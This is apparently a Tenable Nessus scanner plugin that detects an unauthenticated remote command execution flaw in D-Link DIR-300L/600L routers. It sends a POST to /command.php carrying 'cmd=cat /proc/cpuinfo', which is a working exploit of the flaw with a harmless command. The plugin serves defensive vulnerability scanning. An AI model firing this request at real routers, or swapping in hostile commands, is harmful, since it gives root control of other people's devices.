#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(104126);
  script_version("1.3");
  script_cvs_date("Date: 2018/11/15 20:50:16");

  script_bugtraq_id(57734);

  script_name(english:"D-Link DIR-300L/600L Remote Command Execution");
  script_summary(english:"Sends an HTTP POST request");

  script_set_attribute(attribute:"synopsis", value:
"The remote router is affected by a remote command execution
vulnerability");
  script_set_attribute(attribute:"description", value:
"The remote D-Link DIR router is affected by a remote command
execution vulnerability. An unauthenticated remote attacker can use
this vulnerability to execute operating system commands as root.

This vulnerability has been used by the IoT Reaper botnet.");
  script_set_attribute(attribute:"see_also", value:"http://www.s3cur1ty.de/m1adv2013-003");
  script_set_attribute(attribute:"see_also", value:"https://eu.dlink.com/uk/en/support/security-advisory");
  # http://blog.netlab.360.com/iot_reaper-a-rappid-spreading-new-iot-botnet-en/
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?197042fe");
  script_set_attribute(attribute:"solution", value:
"Upgrade to the latest firmware version.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'D-Link Devices Unauthenticated Remote Command Execution');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2013/02/05");
  script_set_attribute(attribute:"patch_publication_date", value:"2013/11/10");
  script_set_attribute(attribute:"plugin_publication_date", value:"2017/10/24");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2017-2018 Tenable Network Security, Inc.");

  script_dependencies("dlink_dir_www_detect.nbin");
  script_require_keys("installed_sw/DLink DIR");
  script_require_ports("Services/www", 80, 8181, 443, 8443);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

appname = 'DLink DIR';
get_install_count(app_name:appname, exit_if_zero:TRUE);
port = get_http_port(default:80, embedded:TRUE);
install = get_single_install(app_name:appname, port:port);

command = 'cmd=cat /proc/cpuinfo';
uri = '/command.php';
res = http_send_recv3(
  method:'POST',
  item:uri,
  add_headers: {'Content-Type':'application/x-www-form-urlencoded'},
  data:command,
  port:port,
  exit_on_fail:TRUE);

if ("200 OK" >!< res[0] || "system type" >!< res[2] || "BogoMIPS" >!< res[2])
{
  audit(AUDIT_HOST_NOT, "an affected D-Link DIR router");
}

security_report_v4(port:port, severity:SECURITY_HOLE, generic:TRUE,
    cmd:"cat /proc/cpuinfo", request:make_list(build_url(qs:uri, port:port)),
    output: res[2]);
